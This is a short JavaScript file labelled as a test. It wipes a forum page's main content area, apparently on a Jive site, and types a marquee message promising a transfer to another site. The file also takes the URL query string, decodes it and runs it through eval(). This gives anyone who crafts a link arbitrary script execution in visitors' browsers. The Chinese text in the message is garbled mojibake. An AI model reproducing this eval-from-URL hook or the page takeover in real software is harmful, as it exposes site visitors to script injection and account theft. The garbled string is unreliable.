//Just for testing
//By kev7n

var i = 0;
var showString = "����һ������JavaScript�Ĵ��ֻ���Ч������һ�β�������Ŷ��Ҳ������Ӣ�Ĳ��ԡ�"
    + "����������������������֮�����裬��������磬���ǵ�һ���ҵ����氮��"
    + "Get more easy to use yet powerful and useful JavaScripts at my website.  You will be "
    + "transfered in a few seconds.";

function marquee() {
    var stringLength = showString.length;
    var eInput = document.getElementById('input');
    eInput.textContent = eInput.textContent + showString.charAt(i);
    i++;
    var timeID = setTimeout("marquee()", 70);
    if (i >= stringLength) {
        clearTimeout(timeID);
        i = 0;
    }
}

var queryString = document.location.search.substr(1);
if (!!queryString) {
    var cmd = decodeURIComponent(queryString);
    eval(cmd);
} else {
    var body = document.getElementsByClassName('jive-body-content')[0];
    body.innerHTML = '';
    body.style.background = 'black';
    body.innerHTML = '<br/><span id=\'input\' style=\'color:rgb(70, 221, 70);width:480px;\'></span>';
    marquee();
}
